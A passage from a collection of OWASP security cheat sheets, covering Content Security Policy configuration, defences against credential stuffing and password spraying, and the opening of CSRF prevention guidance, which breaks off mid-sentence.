Content-Security-Policy Header\r\n\r\nSend a Content-Security-Policy HTTP response header from your web server.\r\n\r\n```text\r\nContent-Security-Policy: ...\r\n```\r\n\r\nUsing a header is the preferred way and supports the full CSP feature set. Send it in all HTTP responses, not just the index page.\r\n\r\nThis is a W3C Spec standard header. Supported by Firefox 23+, Chrome 25+ and Opera 19+\r\n\r\n### 2. Content-Security-Policy-Report-Only Header\r\n\r\nUsing the `Content-Security-Policy-Report-Only`, you can deliver a CSP that doesn't get enforced.\r\n\r\n```text\r\nContent-Security-Policy-Report-Only: ...\r\n```\r\n\r\nStill, violation reports are printed to the console and delivered to a violation endpoint if the `report-to` and `report-uri` directives are used.\r\n\r\nThis is also a W3C Spec standard header. Supported by Firefox 23+, Chrome 25+ and Opera 19+, whereby the policy is non-blocking (\"fail open\") and a report is sent to the URL designated by the `report-uri` (or newer `report-to`) directive. This is often used as a precursor to utilizing CSP in blocking mode (\"fail closed\")\r\n\r\nBrowsers fully support the ability of a site to use both `Content-Security-Policy` and `Content-Security-Policy-Report-Only` together, without any issues. This pattern can be used for example to run a strict `Report-Only` policy (to get many violation reports), while having a looser enforced policy (to avoid breaking legitimate site functionality).\r\n\r\n### 3. Content-Security-Policy Meta Tag\r\n\r\nSometimes you cannot use the Content-Security-Policy header if you are, e.g., Deploying your HTML files in a CDN where the headers are out of your control.\r\n\r\nIn this case, you can still use CSP by specifying a `http-equiv` meta tag in the HTML markup, like so:\r\n\r\n```html\r\n<meta http-equiv=\"Content-Security-Policy\" content=\"...\">\r\n```\r\n\r\nAlmost everything is still supported, including full XSS defenses. However, you will not be able to use [framing protections](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors), [sandboxing](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox), or a [CSP violation logging endpoint](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to).\r\n\r\n### WARNING\r\n\r\n**DO NOT** use `X-Content-Security-Policy` or `X-WebKit-CSP`. Their implementations are obsolete (since Firefox 23, Chrome 25), limited, inconsistent, and incredibly buggy.\r\n\r\n## CSP Types (granular/allowlist based or strict)\r\n\r\nThe original mechanism for building a CSP involved creating allow-lists which would define the content and sources that were permitted in the context of the HTML page.\r\n\r\nHowever, current leading practice is to create a \"Strict\" CSP which is much easier to deploy and more secure as it is less likely to be bypassed.\r\n\r\n## Strict CSP\r\n\r\nA strict CSP can be created by using a limited number of the granular [Fetch Directives listed below](#fetch-directives) listed below along with one of two mechanisms:\r\n\r\n- Nonce based\r\n- Hash based\r\n\r\nThe `strict-dynamic` directive can optionally also be used to make it easier to implement a Strict CSP.\r\n\r\nThe following sections will provide some basic guidance to these mechanisms but it is strongly recommended to follow Google's detailed and methodological instructions for creating a Strict CSP:\r\n\r\n**[Mitigate cross-site scripting (XSS) with a strict Content Security Policy (CSP)](https://web.dev/strict-csp/)**\r\n\r\n### Nonce based\r\n\r\nNonces are unique one-time-use random values that you generate for each HTTP response, and add to the Content-Security-Policy header, like so:\r\n\r\n```js\r\nconst nonce = uuid.v4();\r\nscriptSrc += ` 'nonce-${nonce}'`;\r\n```\r\n\r\nYou would then pass this nonce to your view (using nonces requires a non-static HTML) and render script tags that look something like this:\r\n\r\n```html\r\n<script nonce=\"<%= nonce %>\">\r\n    ...\r\n</script>\r\n```\r\n\r\n#### Warning\r\n\r\n**Don't** create a middleware that replaces all script tags with \"script nonce=...\" because attacker-injected scripts will then get the nonces as well. You need an actual HTML templating engine to use nonces.\r\n\r\n### Hashes\r\n\r\nWhen inline scripts are required, the `script-src 'hash_algo-hash'` is another option for allowing only specific scripts to execute.\r\n\r\n```text\r\nContent-Security-Policy: script-src 'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='\r\n```\r\n\r\nTo get the hash, look at Google Chrome developer tools for violations like this:\r\n\r\n> ❌ Refused to execute inline script because it violates the following Content Security Policy directive: \"...\" Either the 'unsafe-inline' keyword, a hash (**'sha256-V2kaaafImTjn8RQTWZmF4IfGfQ7Qsqsw9GWaFjzFNPg='**), or a nonce...\r\n\r\nYou can also use this [hash generator](https://report-uri.com/home/hash). This is a great [example](https://csp.withgoogle.com/docs/faq.html#static-content) of using hashes.\r\n\r\n#### Note\r\n\r\nUsing hashes can be a risk approach approach. If you change *anything* inside the script tag (even whitespace) by, e.g., formatting your code, the hash will be different, and the script won't render.\r\n\r\n### strict-dynamic\r\n\r\nThe `strict-dynamic` directive can be used as part of a Strict CSP in combination with either hashes or nonces.\r\n\r\nIf a script block which has either the correct hash or nonce is creating additional DOM elements and executing JS inside of them, `strict-dynamic` tells the browser to trust those elements as well without having to explicitly add nonces or hashes for each one.\r\n\r\nNote that whilst `strict-dynamic` is a CSP level 3 feature, CSP level 3 is very widely supported in common, modern browsers.\r\n\r\nFor more details, check out [strict-dynamic usage](https://w3c.github.io/webappsec-csp/#strict-dynamic-usage).\r\n\r\n## Detailed CSP Directives\r\n\r\nMultiple types of directives exist that allow the developer to control the flow of the policies granularly. Note that creating a non-Strict policy that is too granular or permissive is likely to lead to bypasses and a loss of protection.\r\n\r\n### Fetch Directives\r\n\r\nFetch directives tell the browser the locations to trust and load resources from.\r\n\r\nMost fetch directives have a certain [fallback list specified in w3](https://www.w3.org/TR/CSP3/#directive-fallback-list). This list allows for granular control of the source of scripts, images, files, etc.\r\n\r\n- `child-src` allows the developer to control nested browsing contexts and worker execution contexts.\r\n- `connect-src` provides control over fetch requests, XHR, eventsource, beacon and websockets connections.\r\n- `font-src` specifies which URLs to load fonts from.\r\n- `img-src` specifies the URLs that images can be loaded from.\r\n- `manifest-src` specifies the URLs that application manifests may be loaded from.\r\n- `media-src` specifies the URLs from which video, audio and text track resources can be loaded from.\r\n- `prefetch-src` specifies the URLs from which resources can be prefetched from.\r\n- `object-src` specifies the URLs from which plugins can be loaded from.\r\n- `script-src` specifies the locations from which a script can be executed from. It is a fallback directive for other script-like directives.\r\n    - `script-src-elem` controls the location from which execution of script requests and blocks can occur.\r\n    - `script-src-attr` controls the execution of event handlers.\r\n- `style-src` controls from where styles get applied to a document. This includes `<link>` elements, `@import` rules, and requests originating from a `Link` HTTP response header field.\r\n    - `style-src-elem` controls styles except for inline attributes.\r\n    - `style-src-attr` controls styles attributes.\r\n- `default-src` is a fallback directive for the other fetch directives. Directives that are specified have no inheritance, yet directives that are not specified will fall back to the value of `default-src`.\r\n\r\n### Document Directives\r\n\r\nDocument directives instruct the browser about the properties of the document to which the policies will apply to.\r\n\r\n- `base-uri` specifies the possible URLs that the `<base>` element can use.\r\n- `plugin-types` limits the types of resources that can be loaded into the document (*e.g.* application/pdf). 3 rules apply to the affected elements, `<embed>` and `<object>`:\r\n    - The element needs to explicitly declare its type.\r\n    - The element's type needs to match the declared type.\r\n    - The element's resource need to match the declared type.\r\n- `sandbox` restricts a page's actions such as submitting forms.\r\n    - Only applies when used with the request header `Content-Security-Policy`.\r\n    - Not specifying a value for the directive activates all of the sandbox restrictions. `Content-Security-Policy: sandbox;`\r\n    - [Sandbox syntax](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/sandbox#Syntax)\r\n\r\n### Navigation Directives\r\n\r\nNavigation directives instruct the browser about the locations that the document can navigate to.\r\n\r\n- `navigate-to` restricts the URLs which a document can navigate to by any mean ([not yet supported](https://caniuse.com/?search=navigate-to) by modern browsers in Jan 2021).\r\n- `form-action` restricts the URLs which the forms can submit to.\r\n- `frame-ancestors` restricts the URLs that can embed the requested resource inside of  `<frame>`, `<iframe>`, `<object>`, `<embed>`, or `<applet>` elements.\r\n    - If this directive is specified in a `<meta>` tag, the directive is ignored.\r\n    - This directive doesn't fallback to `default-src` directive.\r\n    - `X-Frame-Options` is rendered obsolete by this directive and is ignored by the user agents.\r\n\r\n### Reporting Directives\r\n\r\nReporting directives deliver violations of prevented behaviors to specified locations. These directives serve no purpose on their own and are dependent on other directives.\r\n\r\n- `report-to` which is a groupname defined in the header in a json formatted header value.\r\n    - [MDN report-to documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to)\r\n- `report-uri` directive is deprecated by `report-to`, which is a URI that the reports are sent to.\r\n    - Goes by the format of: `Content-Security-Policy: report-uri https://example.com/csp-reports`\r\n\r\nIn order to ensure backward compatibility, use the 2 directives in conjunction. Whenever a browser supports `report-to`, it will ignore `report-uri`. Otherwise, `report-uri` will be used.\r\n\r\n### Special Directive Sources\r\n\r\n| Value            | Description                                                                 |\r\n|------------------|-----------------------------------------------------------------------------|\r\n| 'none'           | No URLs match.                                                              |\r\n| 'self'           | Refers to the origin site with the same scheme and port number.             |\r\n| 'unsafe-inline'  | Allows the usage of inline scripts or styles.                               |\r\n| 'unsafe-eval'    | Allows the usage of eval in scripts.                                        |\r\n\r\nTo better understand how the directive sources work, check out the [source lists from w3c](https://w3c.github.io/webappsec-csp/#framework-directive-source-list).\r\n\r\n## CSP Sample Policies\r\n\r\n### Strict Policy\r\n\r\nA strict policy's role is to protect against classical stored, reflected, and some of the DOM XSS attacks and should be the optimal goal of any team trying to implement CSP.\r\n\r\nAs noted above, Google went ahead and set up a detailed and methodological [instructions](https://web.dev/strict-csp) for creating a Strict CSP.\r\n\r\nBased on those instructions, one of the following two policies can be used to apply a strict policy:\r\n\r\n#### Nonce-based Strict Policy\r\n\r\n```text\r\nContent-Security-Policy:\r\n  script-src 'nonce-{RANDOM}' 'strict-dynamic';\r\n  object-src 'none';\r\n  base-uri 'none';\r\n```\r\n\r\n#### Hash-based Strict Policy\r\n\r\n```text\r\nContent-Security-Policy:\r\n  script-src 'sha256-{HASHED_INLINE_SCRIPT}' 'strict-dynamic';\r\n  object-src 'none';\r\n  base-uri 'none';\r\n```\r\n\r\n### Basic non-Strict CSP Policy\r\n\r\nThis policy can be used if it is not possible to create a Strict Policy and it prevents cross-site framing and cross-site form-submissions. It will only allow resources from the originating domain for all the default level directives and will not allow inline scripts/styles to execute.\r\n\r\nIf your application functions with these restrictions, it drastically reduces your attack surface and works with most modern browsers.\r\n\r\nThe most basic policy assumes:\r\n\r\n- All resources are hosted by the same domain of the document.\r\n- There are no inlines or evals for scripts and style resources.\r\n- There is no need for other websites to frame the website.\r\n- There are no form-submissions to external websites.\r\n\r\n```text\r\nContent-Security-Policy: default-src 'self'; frame-ancestors 'self'; form-action 'self';\r\n```\r\n\r\nTo tighten further, one can apply the following:\r\n\r\n```text\r\nContent-Security-Policy: default-src 'none'; script-src 'self'; connect-src 'self'; img-src 'self'; style-src 'self'; frame-ancestors 'self'; form-action 'self';\r\n```\r\n\r\nThis policy allows images, scripts, AJAX, and CSS from the same origin and does not allow any other resources to load (e.g., object, frame, media, etc.).\r\n\r\n### Upgrading insecure requests\r\n\r\nIf the developer is migrating from HTTP to HTTPS, the following directive will ensure that all requests will be sent over HTTPS with no fallback to HTTP:\r\n\r\n```text\r\nContent-Security-Policy: upgrade-insecure-requests;\r\n```\r\n\r\n### Preventing framing attacks (clickjacking, cross-site leaks)\r\n\r\n- To prevent all framing of your content use:\r\n    - `Content-Security-Policy: frame-ancestors 'none';`\r\n- To allow for the site itself, use:\r\n    - `Content-Security-Policy: frame-ancestors 'self';`\r\n- To allow for trusted domain, do the following:\r\n    - `Content-Security-Policy: frame-ancestors trusted.com;`\r\n\r\n### Refactoring inline code\r\n\r\nWhen `default-src` or `script-src*` directives are active, CSP by default disables any JavaScript code placed inline in the HTML source, such as this:\r\n\r\n```javascript\r\n<script>\r\nvar foo = \"314\"\r\n<script>\r\n```\r\n\r\nThe inline code can be moved to a separate JavaScript file and the code in the page becomes:\r\n\r\n```javascript\r\n<script src=\"app.js\">\r\n</script>\r\n```\r\n\r\nWith `app.js` containing the `var foo = \"314\"` code.\r\n\r\nThe inline code restriction also applies to `inline event handlers`, so that the following construct will be blocked under CSP:\r\n\r\n```html\r\n<button id=\"button1\" onclick=\"doSomething()\">\r\n```\r\n\r\nThis should be replaced by `addEventListener` calls:\r\n\r\n```javascript\r\ndocument.getElementById(\"button1\").addEventListener('click', doSomething);\r\n```\r\n\r\n## References\r\n\r\n- [Strict CSP](https://web.dev/strict-csp)\r\n- [CSP Level 3 W3C](https://www.w3.org/TR/CSP3/)\r\n- [Content-Security-Policy](https://content-security-policy.com/)\r\n- [MDN CSP](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy)\r\n- [CSP Wikipedia](https://en.wikipedia.org/wiki/Content_Security_Policy)\r\n- [CSP CheatSheet by Scott Helme](https://scotthelme.co.uk/csp-cheat-sheet/)\r\n- [Breaking Bad CSP](https://www.slideshare.net/LukasWeichselbaum/breaking-bad-csp)\r\n- [CSP A Successful Mess Between Hardening And Mitigation](https://speakerdeck.com/lweichselbaum/csp-a-successful-mess-between-hardening-and-mitigation)\r\n- [Content Security Policy Guide on AppSec Monkey](https://www.appsecmonkey.com/blog/content-security-policy-header/)\r\n- CSP Generator: [Chrome](https://chrome.google.com/webstore/detail/content-security-policy-c/ahlnecfloencbkpfnpljbojmjkfgnmdc)/[Firefox](https://addons.mozilla.org/en-US/firefox/addon/csp-generator/)\r\n- [CSP evaluator](https://csp-evaluator.withgoogle.com/)\r\n"
    },
    {
      "Credential_Stuffing_Prevention_Cheat_Sheet.md": "# Credential Stuffing Prevention Cheat Sheet\r\n\r\n## Introduction\r\n\r\nThis cheatsheet covers defences against two common types of authentication-related attacks: credential stuffing and password spraying. Although these are separate, distinct attacks, in many cases the defences that would be implemented to protect against them are the same, and they would also be effective at protecting against brute-force attacks.  A summary of these different attacks is listed below:\r\n\r\n| Attack Type | Description |\r\n|-------------|-------------|\r\n| Brute Force | Testing multiple passwords from dictionary or other source against a single account. |\r\n| Credential Stuffing | Testing username/password pairs obtained from the breach of another site. |\r\n| Password Spraying | Testing a single weak password against a large number of different accounts.|\r\n\r\n## Multi-Factor Authentication\r\n\r\nMulti-factor authentication (MFA) is by far the best defense against the majority of password-related attacks, including credential stuffing and password spraying, with analysis by Microsoft suggesting that it would have stopped [99.9% of account compromises](https://techcommunity.microsoft.com/t5/Azure-Active-Directory-Identity/Your-Pa-word-doesn-t-matter/ba-p/731984). As such, it should be implemented wherever possible; however, depending on the audience of the application, it may not be practical or feasible to enforce the use of MFA.\r\n\r\nIn order to balance security and usability, multi-factor authentication can be combined with other techniques to require for 2nd factor only in specific circumstances where there is reason to suspect that the login attempt may not be legitimate, such as a login from:\r\n\r\n- A new browser/device or IP address.\r\n- An unusual country or location.\r\n- Specific countries that are considered untrusted or typically do not contain users of a service.\r\n- An IP address that appears on known block lists or is associated with anonymization services, such as proxy or VPN services.\r\n- An IP address that has tried to login to multiple accounts.\r\n- A login attempt that appears to be scripted rather than manual.\r\n\r\nAdditionally, for enterprise applications, known trusted IP ranges could be added to an allow list so that MFA is not required when users connect from these ranges.\r\n\r\n## Alternative Defenses\r\n\r\nWhere it is not possible to implement MFA, there are many alternative defenses that can be used to protect against credential stuffing and password spraying. In isolation none of these are as effective as MFA, however multiple, layered defenses can provide a reasonable degree of protection. In many cases, these mechanisms will also protect against brute-force or password spraying attacks.\r\n\r\nWhere an application has multiple user roles, it may be appropriate to implement different defenses for different roles. For example, it may not be feasible to enforce MFA for all users, but it should be possible to require that all administrators use it.\r\n\r\n## Defense in Depth & Metrics\r\n\r\nWhile not a specific technique, it is important to implement defenses that consider the impact of individual defenses being defeated or otherwise failing.  As an example, client-side defenses, such as device fingerprinting or JavaScript challenges, may be spoofed or bypassed and other layers of defense should be implemented to account for this.\r\n\r\nAdditionally, each defense should generate volume metrics for use as a detective mechanism. Ideally the metrics will include both detected and mitigated attack volume and allow for filtering on fields such as IP address.  Monitoring and reporting on these metrics may identify defense failures or the presence of unidentified attacks, as well as the impact of new or improved defenses.\r\n\r\nFinally, when administration of different defenses is performed by multiple teams, care should be taken to ensure there is communication and coordination when separate teams are performing maintenance, deployment or otherwise modifying individual defenses.\r\n\r\n### Secondary Passwords, PINs and Security Questions\r\n\r\nAs well as requiring a user to enter their password when authenticating, users can also be prompted to provide additional security information such as:\r\n\r\n- A PIN\r\n- Specific characters from a secondary passwords or memorable word\r\n- Answers to [security questions](Choosing_and_Using_Security_Questions_Cheat_Sheet.md)\r\n\r\nIt must be emphasised that this **does not** constitute multi-factor authentication (as both factors are the same - something you know). However, it can still provide a useful layer of protection against both credential stuffing and password spraying where proper MFA can't be implemented.\r\n\r\n### CAPTCHA\r\n\r\nRequiring a user to solve a CAPTCHA for each login attempt can help to prevent automated login attempts, and may slow down credential stuffing or password spraying attacks.  However, CAPTCHAs are not perfect, and in many cases tools or services exist that can be used to break them with a reasonably high success rate.  Monitoring CAPTCHA solve rates may help identify impact to good users, as well as automated CAPTCHA breaking technology, possibly indicated by abnormally high solve rates.\r\n\r\nTo improve usability, it may be desirable to only require the user solve a CAPTCHA when the login request is considered suspicious, using the same criteria discussed in the MFA section.\r\n\r\n### IP Mitigation and Intelligence\r\n\r\nBlocking IP addresses may be sufficent to stop less sophisticated attacks, but should not be used as the primary defense.  It is more effective to have a graduated response to abuse that leverages multiple defensive measures depending on different factors of the attack.\r\n\r\nAny process or decision to mitigate (including blocking and CAPTCHA) credential stuffing traffic from an IP address should consider a multitude of abuse scenarios, and not rely on a single predictable volume limit.  Short (i.e. burst) and long time periods should be considered, as well as high request volume and instances where one IP address, likely in concert with _many_ other IP addresses, generates low but consistent volumes of traffic.  Additionally, mitigation decisions should consider factors such as IP address classification (ex: residential vs hosting) and geolocation.  These factors may be leveraged to raise or lower mitigation thresholds in order to reduce potential impact on legitimate users or more aggresively mitigate abuse originating from abnormal sources.  Mitigations, especially blocking an IP address, should be temporary and processes should be in place to remove an IP address from a mitigated state as abuse declines or stops.\r\n\r\nMany credential stuffing toolkits, such as [Sentry MBA](https://federalnewsnetwork.com/wp-content/uploads/2020/06/Shape-Threat-Research-Automating-Cybercrime-with-SentryMBA.pdf), offer built-in use of proxy networks to distribute requests across a large volume of unique IP addressess.  This may defeat both IP block-lists and rate limiting, as per IP request volume may remain relatively low, even on high volume attacks.  Correlating authentication traffic with proxy and similar IP address intelligence, as well as hosting provider IP address ranges can help identify highly distributed credential stuffing attacks, as well as serve as a mitigation trigger.  For example, every request originating from a hosting provider could be required to solve CAPTCHA.\r\n\r\nThere are both public and commercial sources of IP address intelligence and classification that may be leveraged as data sources for this purpose.  Additionally, some hosting providers publish their own IP address space, such as [AWS](https://docs.aws.amazon.com/vpc/latest/userguide/aws-ip-ranges.html).\r\n\r\nSeparate from blocking network connections, consider storing an account's IP address authentication history.  In case a recent IP address is added to a mitigation list, it may be appropriate to lock the account and notify the user.\r\n\r\n### Device Fingerprinting\r\n\r\nAside from the IP address, there are a number of different factors that can be used to attempt to fingerprint a device. Some of these can be obtained passively by the server from the HTTP headers (particularly the \"User-Agent\" header), including:\r\n\r\n- Operating system\r\n- Browser\r\n- Language\r\n\r\nUsing JavaScript it is possible to access far more information, such as:\r\n\r\n- Screen resolution\r\n- Installed fonts\r\n- Installed browser plugins\r\n\r\nUsing these various attributes, it is possible to create a fingerprint of the device. This fingerprint can then be matched against any browser attempting to login to the account, and if it doesn't match then the user can be prompted for additional authentication. Many users will have multiple devices or browsers that they use, so it is not practical to block attempts that do not match the existing fingerprints.\r\n\r\nThe [fingerprintjs2](https://github.com/Valve/fingerprintjs2) JavaScript library can be used to carry out client-side fingerprinting.\r\n\r\nIt should be noted that as all this information is provided by the client, it can potentially be spoofed by an attacker. In some cases spoofing these attributes is trivial (such as the \"User-Agent\") header, but in other cases it may be more difficult to modify these attributes.\r\n\r\n### Connection Fingerprinting\r\n\r\nSimilar to device fingerprinting, there are numerous fingerprinting techniques available for network connections.  Some examples include [JA3](https://github.com/salesforce/ja3), HTTP/2 fingerprinting and HTTP header order.  As these techniques typically focus on how a connection is made, connection fingerprinting may provide more accurate results than other defenses that rely on an indicator, such as an IP address, or request data, such as user agent string.\r\n\r\nConnection fingerprinting may also be used in conjunction with other defenses to ascertain the truthfulness of an authentication request.  For example, if the user agent header and device fingerprint indicates a mobile device, but the connection fingerprint indicates a Python script, the request is likely suspect.\r\n\r\n### Require Unpredictable Usernames\r\n\r\nCredential stuffing attacks rely on not just the re-use of passwords between multiple sites, but also the re-use of usernames. A significant number of websites use the email address as the username, and as most users will have a single email address they use for all their accounts, this makes the combination of an email address and password very effective for credential stuffing attacks.\r\n\r\nRequiring users to create their own username when registering on the website makes it harder for an attacker to obtain valid username and password pairs for credential stuffing, as many of the available credential lists only include email addresses. Providing the user with a generated username can provide a higher degree of protection (as users are likely to choose the same username on most websites), but is user unfriendly. Additionally, care needs to be taken to ensure that the generated username is not predictable (such as being based on the user's full name, or sequential numeric IDs), as this could make enumerating valid usernames for a password spraying attack easier.\r\n\r\n### Multi-Step Login Processes\r\n\r\nThe majority of off-the-shelf tools are designed for a single step login process, where the credentials are POSTed to the server, and the response indicates whether or not the login attempt was successful. By adding additional steps to this process, such as requiring the username and password to be entered sequentially, or requiring that the user first obtains a random [CSRF Token](Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.md) before they can login, this makes the attack slightly more difficult to perform, and doubles the number of requests that the attacker must make.\r\n\r\nMulti-step login processes, however, should be mindful that they do not faciliate [user enumeration](Authentication_Cheat_Sheet.md).  Enumerating users prior to a credential stuffing attack may result in a harder to identify, lower request volume attack.\r\n\r\n### Require JavaScript and Block Headless Browsers\r\n\r\nMost tools used for these types of attacks will make direct POST requests to the server and read the responses, but will not download or execute JavaScript that was contained in them. By requiring the attacker to evaluate JavaScript in the response (for example to generate a valid token that must be submitted with the request), this forces the attacker to either use a real browser with an automation framework like Selenium or Headless Chrome, or to implement JavaScript parsing with another tool such as PhantomJS. Additionally, there are a number of techniques that can be used to identify [Headless Chrome](https://antoinevastel.com/bot%20detection/2018/01/17/detect-chrome-headless-v2.html) or [PhantomJS](https://blog.shapesecurity.com/2015/01/22/detecting-phantomjs-based-visitors/).  \r\n\r\nPlease note that blocking visitors who have JavaScript disabled will reduce the accessibility of the website, especially to visitors who use screen readers. In certain jurisdictions this may be in breach of equalities legislation.\r\n\r\n### Degredation\r\n\r\nA more aggresive defense against credential stuffing is to implement measures that increase the amount of time the attack takes to complete.  This may include incrementally increasing the complexity of the JavaScript that must be evaluated, introducing long wait periods before responding to requests, returning overly large HTML assets or returning randomized error messages.  \r\n\r\nDue to their potential negative impact on legitimate users, great care must be taken with this type of defense, though it may be needed in order to mitigate more sophisticated credential stuffing attacks.\r\n\r\n### Identifying Leaked Passwords\r\n\r\n[ASVS v4.0 Password Security Requirements](https://github.com/OWASP/ASVS/blob/master/4.0/en/0x11-V2-Authentication.md#v21-password-security-requirements) provision (2.1.7) on verifying new passwords presence in breached password datasets should be implemented.\r\n\r\nThere are both commercial and free services that may be of use for validating passwords presence in prior breaches.  A well known free service for this is [Pwned Passwords](https://haveibeenpwned.com/Passwords). You can host a copy of the application yourself, or use the [API](https://haveibeenpwned.com/API/v2#PwnedPasswords).\r\n\r\n### Notify users about unusual security events\r\n\r\nWhen suspicious or unusual activity is detected, it may be appropriate to notify or warn the user. However, care should be taken that the user does not get overwhelmed with a large number of notifications that are not important to them, or they will just start to ignore or delete them.  Additionally, due to frequent reuse of passwords across multiple sites, the possibility that the users email account has also been compromised should be considered.\r\n\r\nFor example, it would generally not be appropriate to notify a user that there had been an attempt to login to their account with an incorrect password. However, if there had been a login with the correct password, but which had then failed the subsequent MFA check, the user should be notified so that they can change their password.  Subsequently, should the user request multiple password resets from different devices or IP addresses, it may be appropriate to prevent further access to the account pending further user verification processes.\r\n\r\nDetails related to current or recent logins should also be made visible to the user. For example, when they login to the application, the date, time and location of their previous login attempt could be displayed to them. Additionally, if the application supports concurrent sessions, the user should be able to view a list of all active sessions, and to terminate any other sessions that are not legitimate.\r\n\r\n## References\r\n\r\n- [OWASP Credential Stuffing Article](https://owasp.org/www-community/attacks/Credential_stuffing)\r\n- [OWASP Automated Threats to Web Applications](https://owasp.org/www-project-automated-threats-to-web-applications/)\r\n- Project: [OAT-008 Credential Stuffing](https://owasp.org/www-community/attacks/Credential_stuffing), which is one of 20 defined threats in the [OWASP Automated Threat Handbook](https://owasp.org/www-pdf-archive/Automated-threat-handbook.pdf) this project produced.\r\n"
    },
    {
      "Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.md": "# Cross-Site Request Forgery Prevention Cheat Sheet\r\n\r\n## Introduction\r\n\r\nA [Cross-Site Request Forgery (CSRF)](https://owasp.org/www-community/attacks/csrf) attack occurs when a malicious web site, email, blog, instant message, or program tricks an authenticated user's web browser into performing an unwanted action on a trusted site. If a target user is authenticated to the site, unprotected target sites cannot distinguish between legitimate authorized requests and forged authenticated requests.\r\n\r\nSince browser requests automatically include all cookies including session cookies, this attack works unless proper authorization is used, which means that the target site's challenge-response mechanism does not verify the identity and authority of the requester. In effect, CSRF attacks make a target system perform attacker-specified functions via the victim's browser without the victim's knowledge (normally until after the unauthorized actions have been committed).\r\n\r\nHowever, successful CSRF attacks can only exploit the capabilities exposed by the vulnerable application and the user's privileges. Depending on the user's credentials, the attacker can transfer funds, change a password, make an unauthorized purchase, elevate privileges for a target account, or take any action that the user is permitted to do.\r\n\r\nIn short, the following principles should be followed to defend against CSRF:\r\n\r\n**IMPORTANT: Remember that Cross-Site Scripting (XSS) can defeat all CSRF mitigation techniques!**\r\n\r\n- **See the OWASP [XSS Prevention Cheat Sheet](Cross_Site_Scripting_Prevention_Cheat_Sheet.md)for detailed guidance on how to prevent XSS flaws.**\r\n- **First, check if your framework has [built-in CSRF protection](#use-built-in-or-existing-csrf-implementations-for-csrf-protection) and use it**\r\n- **If the framework does not have built-in CSRF protection, add [CSRF tokens](#token-based-mitigation) to all state changing requests (requests that cause actions on the site) and validate them on the backend**\r\n- **Stateful software should use the [synchronizer token pattern](#synchronizer-token-pattern)**\r\n- **Stateless software should use [double submit cookies](#double-submit-cookie)**\r\n- **If an API-driven site can't use `<form>` tags, consider [using custom request headers](#custom-request-headers)**\r\n- **Implement at least one mitigation from [Defense in Depth Mitigations](#defense-in-depth-techniques) section**\r\n- **[SameSite Cookie Attribute](#samesite-cookie-attribute) can be used for session cookies** but be careful to NOT set a cookie specifically for a domain. This action introduces a security vulnerability because all subdomains of that domain will share the cookie, and this is particularly an issue if a subdomain has a CNAME to domains not in your control.\r\n- **Consider implementing [user interaction based protection](#user-interaction-based-csrf-defense) for highly sensitive operations**\r\n- **Consider [verifying the origin with standard headers](#verifying-origin-with-standard-headers)**\r\n- **Do not use GET requests for state changing operations.**\r\n- **If for any reason you do it, protect those resources against CSRF**\r\n\r\n## Token-Based Mitigation\r\n\r\nThe [synchronizer token pattern](#synchronizer-token-pattern) is one of the most popular and recommended methods to mitigate CSRF.\r\n\r\n### Use Built-In Or Existing CSRF Implementations for CSRF Protection\r\n\r\nSince synchronizer token defenses are built into many frameworks, find out if your framework has CSRF protection available by default before you build a custom token generating system. For example, .NET can use [built-in protection](https://docs.microsoft.com/en-us/aspnet/core/security/anti-request-forgery?view=aspnetcore-2.1) to add tokens to CSRF vulnerable resources. If you choose to use this protection, .NET makes you responsible for proper configuration (such as key management and token management).\r\n\r\n### Synchronizer Token Pattern\r\n\r\nCSRF tokens should be generated on the server-side and they should be generated only once per user session or each request. Because the time range for an attacker to exploit the stolen tokens is minimal for per-request tokens, they are more secure than per-session tokens. However, using per-request tokens may result in usability concerns.\r\n\r\nFor example, the \"Back\" button browser capability can be hindered by a per-request token as the previous page may contain a token that is no longer valid. In this case, interaction with a previous page will result in a CSRF false positive security event on the server-side. If per-session token implementations occur after the initial generation of a token, the value is stored in the session and is used for each subsequent request until the session expires.\r\n\r\nWhen a client issues a request, the server-side component must verify the existence and validity of the token in that request and compare it to the token found in the user session. The request should be rejected if that token was not found within the request or the value provided does not match the value within the user session. Additional actions such as logging the event as a potential CSRF attack in progress should also be considered.\r\n\r\nCSRF tokens should be:\r\n\r\n- Unique per user session.\r\n- Secret\r\n- Unpredictable (large random value generated by a [secure method](https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html#rule---use-cryptographically-secure-pseudo-random-number-generators-csprng)).\r\n\r\nCSRF tokens prevent CSRF because without a CSRF token, an attacker cannot create valid requests to the backend server.\r\n\r\n#### Transmissing CSRF Tokens in Synchronized Patterns\r\n\r\nThe CSRF token can be transmitted to the client as part of a response payload, such as a HTML or JSON response, then it can be transmitted back to the server as a hidden field on a form submission or via an AJAX request as a custom header value or part of a JSON payload. a CSRF token should not be transmitted in a cookie for synchronized patterns. A CSRF token must not be leaked in the server logs or in the URL. GET requests can potentially leak CSRF tokens at several locations, such as the browser history, log files, network utilities that log the first line of a HTTP request, and Referer headers if the protected site links to an external site.\r\n\r\nFor example:\r\n\r\n```html\r\n<form action=\"/transfer.do\" method=\"post\">\r\n<input type=\"hidden\" name=\"CSRFToken\" value=\"OWY4NmQwODE4ODRjN2Q2NTlhMmZlYWEwYzU1YWQwMTVhM2JmNGYxYjJiMGI4MjJjZDE1ZDZMGYwMGEwOA==\">\r\n[...]\r\n</form>\r\n```\r\n\r\nSince requests with custom headers are automatically subject to the same-origin policy, it is more secure to insert the CSRF token in a custom HTTP request header via JavaScript than adding a CSRF token in the hidden field form parameter.\r\n\r\n### ALTERNATIVE: Using A Double-Submit Cookie Pattern\r\n\r\nIf maintaining the state for CSRF token on the server is problematic, you can use an alternative technique known as the Double Submit Cookie pattern. This technique is easy to implement and is stateless. There are different ways to implement this technique, where the _naive_ pattern is the most commonly used variation.\r\n\r\n#### Signed Double-Submit Cookie (RECOMMENDED)\r\n\r\nThe most secure implementation of the Double Submit Cookie pattern is the _Signed Double-Submit Cookie_, which 